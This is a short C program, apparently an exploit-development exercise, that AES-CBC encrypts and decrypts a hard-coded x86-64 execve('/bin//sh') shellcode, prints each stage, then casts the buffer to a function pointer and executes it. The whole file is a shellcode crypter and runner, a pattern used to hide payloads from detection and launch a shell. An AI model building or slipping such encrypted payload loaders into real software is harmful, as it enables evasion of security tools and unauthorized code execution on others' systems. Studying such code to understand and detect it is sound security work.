#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "aes.h"

void prettyprint(uint8_t shellcode[])
{
	for (int i = 0; i < strlen((char *)shellcode); i++)
	{
		printf("\\x%02x", shellcode[i]);
	}
}

void encrypt(uint8_t shellcode[], uint8_t key[], uint8_t iv[])
{

	printf("\n\nEncrypted shellcode:\n");

	struct AES_ctx ctx;

	AES_init_ctx_iv(&ctx, key, iv);

	AES_CBC_encrypt_buffer(&ctx, shellcode, strlen((char *)shellcode));

}

void decrypt(uint8_t shellcode[], uint8_t key[], uint8_t iv[])
{

        printf("\n\nDecrypted shellcode:\n");

        struct AES_ctx ctx;

        AES_init_ctx_iv(&ctx, key, iv);

        AES_CBC_decrypt_buffer(&ctx, shellcode, strlen((char *)shellcode));

}

int main()
{

	uint8_t shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

	uint8_t key[] = {0xa2, 0x74, 0x56, 0x78, 0x9a, 0xef, 0x56, 0x78, 0xa2, 0x74, 0xa2, 0x74, 0x74, 0xa2, 0x74, 0xa2};

	uint8_t iv[] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef};

	printf("\nPlaintext shellcode:\n");
	prettyprint(shellcode);

	encrypt(shellcode, key, iv);

	prettyprint(shellcode);

	decrypt(shellcode, key, iv);

	prettyprint(shellcode);

	printf("\n\nExecuting decrypted shellcode...\n");

	sleep(1);

	int (*ret)() = (int(*)())shellcode;

	ret();

	return 0;
}
